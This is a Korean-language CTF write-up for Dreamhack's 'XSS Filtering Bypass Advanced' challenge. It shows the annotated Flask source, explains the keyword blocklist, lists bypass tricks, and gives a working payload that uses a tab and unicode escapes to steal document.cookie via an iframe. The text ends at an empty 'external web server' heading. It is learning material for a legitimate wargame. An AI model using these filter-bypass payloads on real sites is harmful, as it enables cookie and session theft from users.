# [Dreamhack Wargame] XSS Filtering Bypass Advanced
### [🚩XSS Filtering Bypass Advanced](https://dreamhack.io/wargame/challenges/434/)
  <img width="1069" alt="XSS Filtering Bypass Advanced_Description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/3e3e4c76-8cf0-422b-abe1-bd030690863d">

<br/><br/>

## 문제 파일(app.py) 분석
```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}" # vuln 페이지에 param 파라미터의 값을 이용자의 입력값으로 하여 URL 주소를 생성함
    return read_url(url, cookie)

# XSS 취약점을 막기 위한 필터링 함수
def xss_filter(text):
    # 1번 필터
    _filter = ["script", "on", "javascript"] # script, on, javascript의 3가지 키워드를 필터링하고 있음
    for f in _filter:
        if f in text.lower(): # 필터링 검사를 수행할 때 사용자의 입력값을 모두 소문자로 변환하여 검사를 진행함 (대소문자 혼용 및 대문자 사용으로 필터링 우회 불가)
            return "filtered!!!" # 공백으로 치환하지 않고 필터링되었다는 문자열을 반환함

    # 2번 필터(1번 수행 후 다시 한 번 필터링 수행)
    advanced_filter = ["window", "self", "this", "document", "location", "(", ")", "&#"] # XSS Filtering Bypass 문제보다 필터링힐 키워드가 추가됨
    for f in advanced_filter:
        if f in text.lower(): # 필터링 검사를 수행할 때 사용자의 입력값을 모두 소문자로 변환하여 검사를 진행함
            return "filtered!!!" # 공백으로 치환하지 않고 필터링되었다는 문자열을 반환함

    return text


# 인덱스 페이지
@app.route("/")
def index():
    return render_template("index.html")


# vuln 페이지: 이용자가 입력한 값을 출력함
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "") # 이용자가 전달한 param 파라미터의 값을 가져옴
    param = xss_filter(param) # 전달받은 param(이용자의 입력값)을 xss_filter() 함수를 통해 필터링하여 XSS 취약점을 막으려고 시도함
    return param # param 파라미터의 값을 return문을 이용해 화면에 그대로 출력함


# flag 페이지: 전달된 URL에 임의 이용자가 접속하게끔 함 (해당 이용자의 쿠키에 FLAG가 존재함)
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET": # GET 메소드로 요청 시
        return render_template("flag.html") # 이용자에게 URL을 입력받는 페이지(flag.html)을 제공함
    elif request.method == "POST": # POST 메소드로 요청 시
        param = request.form.get("param") # 이용자가 전달한 param 파라미터의 값을 가져옴
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}): # param 파라미터의 값과 쿠키에 FLAG를 포함하여 check_xss() 함수를 호출함
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = "" # memo 페이지에서 사용할 변수

# memo 페이지: 이용자가 메모를 남길 수 있으며, 작성한 메모를 화면에 출력함
@app.route("/memo")
def memo():
    global memo_text # memo_text를 전역(global)으로 설정
    text = request.args.get("memo", "") # 이용자가 전달한 memo 파라미터의 값을 가져옴
    memo_text += text + "\n" # 전역변수 memo_text의 뒤에 이용자가 전달한 text와 개행 문자(\n)를 추가함
    return render_template("memo.html", memo=memo_text) # render_template() 함수를 이용해 memo_text의 내용을 화면에 출력힘 (HTML 엔티티 코드로 변환해 저장함)


app.run(host="0.0.0.0", port=8000)
```

<br/><br/>

## 문제 풀이
### 취약점이 존재하는 부분
vuln 페이지에서 전달된 탬플릿 변수를 기록할 때 HTML 엔티티 코드로 변환하여 저장하기 때문에 XSS 취약점이 발생하지 않는 ```render_template``` 함수를 이용하지 않고 ```return```을 통해 이용자의 입력값을 페이지에 그대로 출력하기 때문에 XSS 취약점이 발생함
* ```xss_filter()``` 함수를 이용한 필터링
    - XSS Filtering Bypass 문제와 동일하게 ```script```, ```on```, ```javascript``` 키워드를 필터링하고 있지만, 키워드를 단순히 치환(제거)하는 방식을 사용하지 않고 키워드가 탐지되었을 경우 ```"filtered!!"``` 문자열을 반환함
    - ```script```, ```on```, ```javascript```로 필터링을 수행한 다음 추가된 키워드인 ```window```, ```self```, ```this```, ```document```, ```location```, ```(```, ```)```, ```&#```로 다시 한 번 필터링을 진행하고 키워드가 탐지되었을 경우 ```"filtered!!"``` 문자열을 반환함
* 필터링 키워드를 단순히 치환하는 방식이 아니라 ```"filtered!!"``` 문자열을 반환하는 방식이기 때문에 **키워드의 중첩 사용으로 우회가 불가능함**
    - XSS 필터링을 우회하는 방법
        | 우회 방법 | 설명 |
        |---|------|
        | **다른 태그와 속성 사용** | ```<script>``` 태그 대신에 ```<iframe>``` 태그의 ```src``` 속성을 이용함 |
        | **정규화를 이용한 우회** | ```javascript:``` 스키마 사용을 필터링하고 있으므로 중간에 탭을 넣어 정규화를 통해 이를 우회함 |
        | **Unicode escape sequence 이용** | ```document```, ```location```의 ```d```를 ```\u0064```, ```on```을 ```\u006f\u006e```로 변환하여 우회 |

<br/><br/>

### 익스플로잇
#### 방법 1: memo 페이지 이용
1. flag 포인트에서 ```<iframe src='javascr	ipt:\u0064ocument.locati\u006f\u006e.href = "/memo?memo=" + \u0064ocument.cookie;'/>```를 입력하고 제출 버튼을 클릭함
    - ```<iframe src='javascript:document.location.href="/memo?memo="+document.cookie;'/>```를 입력한 것과 동일함
  <img width="978" alt="memo_1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/9e916426-df8a-4ee5-8786-994b60f8ca06">


2. "good" 알림창이 출력되면 memo 페이지로 이동하여 화면에 출력된 임의 이용자의 쿠키 정보(FLAG)를 획득함
  <img width="978" alt="memo_2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/b1f5cc7d-a9ab-460e-933d-18b985663a56">

<br/>

#### 방법 2: 외부 웹 서버 이용

